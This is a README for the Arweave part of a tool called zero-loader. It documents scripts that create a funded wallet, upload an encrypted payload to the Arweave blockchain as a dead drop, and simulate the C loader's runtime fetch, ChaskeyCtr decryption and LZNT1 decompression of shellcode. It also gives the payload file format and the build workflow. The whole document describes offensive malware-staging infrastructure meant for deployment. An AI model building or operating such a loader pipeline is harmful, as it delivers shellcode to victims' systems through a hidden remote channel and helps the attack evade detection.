# arweave/

Arweave dead-drop scripts for zero-loader. Three files, one responsibility each.

## Files

| File | Purpose |
|------|---------|
| `create.py` | Generate a new Arweave wallet keypair and save it as `wallet.json` |
| `upload.py` | Upload a combined `data.enc` to Arweave as a single transaction |
| `download.py` | Simulate the full C loader pipeline — GraphQL → download → decrypt → decompress |
| `wallet.json` | Funded Arweave keypair (never commit to source control) |

---

## create.py

Generate a new RSA-4096 Arweave wallet.

```
python arweave/create.py [output.json]
```

- Generates a fresh keypair and saves it as `wallet.json` (or the specified path)
- Derives and prints the Arweave wallet address
- Fund the wallet at [arweave.net](https://arweave.net) before uploading

```
python arweave/create.py --json
```

Machine-readable output — used internally by `web/server.py` when creating wallets through the web console.

---

## upload.py

Upload `data.enc` to Arweave as a confirmed transaction.

```
python arweave/upload.py <data.enc> [wallet.json] [--json]
```

**Arguments:**

| Argument | Default | Description |
|----------|---------|-------------|
| `data.enc` | required | Combined file from `Encrypt.py` |
| `wallet.json` | `arweave/wallet.json` | Arweave keypair with AR balance |
| `--json` | off | Machine-readable output (used by web console) |

**What it does:**

1. Validates that `data.enc` starts with the expected combined header
2. Checks wallet AR balance — exits early if 0 AR
3. Uploads the file as a single Arweave transaction with tags:
   - `App-Name: zero-loader`
   - `zero-loader-type: payload-v2`
   - `Content-Type: application/octet-stream`
4. Prints the TX ID and `arweave.net/<txid>` URL

**Note:** Arweave transaction confirmation takes 10-30 minutes. The C loader's retry loop handles this automatically.

---

## download.py

Simulate the exact pipeline that `Arweave.c` + `Crypt.c` run at loader runtime. Use this to verify the full chain before deploying.

```
python arweave/download.py <wallet_address> [--save <output.bin>]
```

**Arguments:**

| Argument | Default | Description |
|----------|---------|-------------|
| `wallet_address` | required | 43-char base64url Arweave address |
| `--save` | `shellcode.bin` | Output path for decrypted shellcode |

**Pipeline (mirrors C code exactly):**

| Step | C function | Python equivalent |
|------|-----------|-------------------|
| 1 | `ArwDoRequest` POST `/graphql` | `urllib` POST with identical query body |
| 2 | `ArwFindBytes` + base64url check | regex `"id":"([A-Za-z0-9_-]{43})"` |
| 3 | `ArwDoRequest` GET `/<txid>` | `urllib` GET |
| 4 | `ArwParseHeader` | 4-pipe scan, hex decode, decimal parse |
| 5 | `ChaskeyCtrDecrypt` | Chaskey-12 ARX, CTR, little-endian u32 |
| 6 | `RtlDecompressBuffer LZNT1` | ctypes call into ntdll (Windows only) |

If the pipeline completes, the decrypted shellcode is saved to disk and its size is compared against `orig_size` from the header.

**Requirements:** Windows only (step 6 uses ntdll). No pip packages needed.

---

## Combined File Format

`Encrypt.py` produces `data.enc` in this format:

```
<32-hex-key>|<24-hex-nonce>|<decimal-orig-size>|<0|1>|<binary-encrypted-payload>
```

- The first 4 `|` characters delimit the ASCII header
- Everything after the 4th `|` is the raw encrypted payload
- The C loader (`ArwParseHeader`) scans the first 128 bytes for 4 pipes — pipe-counting is unambiguous because hex characters never contain `0x7C`
- No separate key transaction; no rebuild required after a new upload

---

## Workflow

```
# One-time setup
python arweave/create.py          # → wallet.json
# Fund wallet.json with AR tokens

# Each new payload
python Encrypt.py payload.bin --wallet <ADDRESS>   # → data.enc + Payload.h
python arweave/upload.py data.enc                  # → TX ID
python arweave/download.py <ADDRESS>               # verify before building
build.bat
```
